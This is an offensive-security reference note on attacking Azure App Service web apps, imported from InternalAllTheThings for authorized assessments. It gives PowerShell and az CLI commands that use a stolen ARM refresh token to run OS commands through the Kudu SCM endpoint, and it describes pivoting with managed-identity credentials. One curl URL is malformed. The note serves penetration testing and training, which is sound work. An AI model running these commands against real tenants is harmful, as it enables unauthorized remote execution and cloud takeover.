---
title: Azure Services - Web Apps
type: technique
tags: [azure, cloud, exploitation, reference-import, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Azure Services - Web Apps

## What it is

Technical reference for **Azure Services - Web Apps** collected from InternalAllTheThings during an internal/cloud assessment ingest.

## How it works

Azure App Service web apps can execute arbitrary OS commands via the Kudu SCM endpoint (`<app>.scm.azurewebsites.net/api/command`) when an attacker holds an ARM token with `Contributor` rights over the web app. Web apps with system-assigned managed identities expose temporary credentials through the internal IDENTITY_ENDPOINT, allowing an attacker with RCE on the app to pivot to Azure resource management. Environment variables, application settings, and connection strings stored in the App Service configuration are accessible via the Azure portal or API to any principal with `Reader` access or higher.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## List Web App

```ps1
az webapp list
```

## Execute Commands

```ps1
$ARMToken = Get-ARMTokenWithRefreshToken `
    -RefreshToken "0.ARwA6WgJJ9X2qk..." `
    -TenantID "contoso.onmicrosoft.com"

Invoke-AzureRMWebAppShellCommand `
    -KuduURI "https://<webapp>.scm.azurewebsites.net/api/command" `
    -Token $ARMToken `
    -Command "whoami"
```

## SSH Connection

First check if the SSH over HTTP connection is enabled: `(curl https://${appName}?app.scm.azurewebsites.net/webssh/host).statuscode`

```powershell
az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
```

## Kudu

In Azure App Service, Kudu is the advanced management and deployment tool used for various operations such as continuous integration, troubleshooting, and diagnostic tasks for your web applications. It provides a set of utilities and features for managing your app’s environment, including access to application settings, log streams, and deployment management.

You can access this Kudu app at the following URLs:

* App not in the Isolated tier: `https://<app-name>.scm.azurewebsites.net`
* Internet-facing app in the Isolated tier (App Service Environment): `https://<app-name>.scm.<ase-name>.p.azurewebsites.net`
* Internal app in the Isolated tier (App Service Environment for internal load balancing): `https://<app-name>.scm.<ase-name>.appserviceenvironment.net`

Key Features of Kudu in App Service:

* **Web-Based Console**: Provides a command-line interface (CLI) to execute commands directly on the App Service environment.
* **File Explorer**: Lets you view and manage files in your app’s environment.
* **Environment Diagnostics**: Offers insights into the environment variables, app settings, and detailed diagnostic logs.
* **Process Explorer**: Allows you to monitor and manage running processes in your app’s environment.
* **Access to Logs**: Easily view, download, and stream logs for debugging and troubleshooting.

## References

* [Training - Attacking and Defending Azure Lab - Altered Security](https://www.alteredsecurity.com/azureadlab)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

Tool references are inline in **Methodology**; see the `tools/` pages for CLI usage.

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
